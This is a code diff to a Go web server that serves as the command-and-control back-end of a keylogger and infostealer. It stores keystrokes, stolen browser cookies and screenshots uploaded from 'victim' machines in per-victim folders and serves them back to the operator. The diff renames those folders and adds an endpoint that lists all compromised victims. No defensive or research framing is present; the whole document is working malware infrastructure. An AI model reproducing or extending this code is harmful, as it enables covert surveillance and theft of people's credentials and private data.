@@ -8,9 +8,11 @@ import (
 	_ "github.com/gin-gonic/gin"
 	"image"
 	"image/png"
+	"io/ioutil"
 	"net/http"
 	"os"
 	"regexp"
+	"strings"
 	"time"
 )
 import _ "net/http"
@@ -65,7 +67,7 @@ func main() {
 	sv.POST("/", func(c *gin.Context) {
 		var text TextLog
 		if err := c.ShouldBindJSON(&text); err == nil {
-			file, err := os.OpenFile(fmt.Sprintf("%s/%s", text.Log.Victim, KeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
+			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, KeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
 			defer func(file *os.File) {
 				err := file.Close()
 				if err != nil {
@@ -92,7 +94,7 @@ func main() {
 	sv.POST("/lazyKeylog", func(c *gin.Context) {
 		var text TextLog
 		if err := c.ShouldBindJSON(&text); err == nil {
-			file, err := os.OpenFile(fmt.Sprintf("%s/%s", text.Log.Victim, LazyKeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
+			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, LazyKeylogFilename), os.O_APPEND|os.O_CREATE, 0755)
 			defer func(file *os.File) {
 				err := file.Close()
 				if err != nil {
@@ -160,8 +162,8 @@ func main() {
 	sv.POST("/owner", func(context *gin.Context) {
 		var text TextLog
 		if err := context.ShouldBindJSON(&text); err == nil {
-			if _, err = os.Stat(fmt.Sprintf("./%s", text.Log.Victim)); os.IsNotExist(err) {
-				err := os.Mkdir(text.Log.Victim, 0755)
+			if _, err = os.Stat(fmt.Sprintf("./victim-%s", text.Log.Victim)); os.IsNotExist(err) {
+				err := os.Mkdir(fmt.Sprintf("victim-%s", text.Log.Victim), 0755)
 				if err != nil {
 					context.JSON(http.StatusBadRequest, gin.H{
 						ActionKey: "Cannot create directory",
@@ -175,7 +177,7 @@ func main() {
 	sv.POST("/cookies", func(c *gin.Context) {
 		var text TextLog
 		if err := c.ShouldBindJSON(&text); err == nil {
-			file, err := os.OpenFile(fmt.Sprintf("%s/%s", text.Log.Victim, CookiesFilename), os.O_APPEND|os.O_CREATE, 0755)
+			file, err := os.OpenFile(fmt.Sprintf("victim-%s/%s", text.Log.Victim, CookiesFilename), os.O_APPEND|os.O_CREATE, 0755)
 			defer func(file *os.File) {
 				err := file.Close()
 				if err != nil {
@@ -210,7 +212,7 @@ func main() {
 			}
 
 			//save the imgByte to file
-			out, err := os.Create(fmt.Sprintf("%s/%s", text.Log.Victim, ScreenshotFilename))
+			out, err := os.Create(fmt.Sprintf("victim-%s/%s", text.Log.Victim, ScreenshotFilename))
 			defer out.Close()
 
 			if err != nil {
@@ -238,7 +240,7 @@ func main() {
 			c.AbortWithError(http.StatusBadRequest, err)
 			return
 		}
-		img, err := getImageFromFilePath(fmt.Sprintf("%s/%s", text.Victim, ScreenshotFilename))
+		img, err := getImageFromFilePath(fmt.Sprintf("victim-%s/%s", text.Victim, ScreenshotFilename))
 		if err != nil {
 			c.AbortWithError(http.StatusBadRequest, err)
 			return
@@ -255,6 +257,20 @@ func main() {
 
 	sv.GET("/cookies/:victim", func(c *gin.Context) {
 		GetFileContent(c, CookiesFilename)
+	})
+
+	sv.GET("/victims/", func(c *gin.Context) {
+		var rez []string
+		files, err := ioutil.ReadDir("./")
+		if err != nil {
+			c.AbortWithError(400, err)
+		}
+		for _, file := range files {
+			if file.IsDir() && strings.HasPrefix(file.Name(), "victim") {
+				rez = append(rez, file.Name())
+			}
+		}
+		c.JSON(200, rez)
 	})
 
 	sv.GET("/keylog/:victim", func(c *gin.Context) {
@@ -274,7 +290,7 @@ func GetFileContent(c *gin.Context, filename string) {
 		c.AbortWithError(http.StatusBadRequest, err)
 		return
 	}
-	text, err := getTextFromFilePath(fmt.Sprintf("%s/%s", victim.Victim, filename))
+	text, err := getTextFromFilePath(fmt.Sprintf("victim-%s/%s", victim.Victim, filename))
 	if err != nil {
 		c.AbortWithError(http.StatusBadRequest, err)
 		return
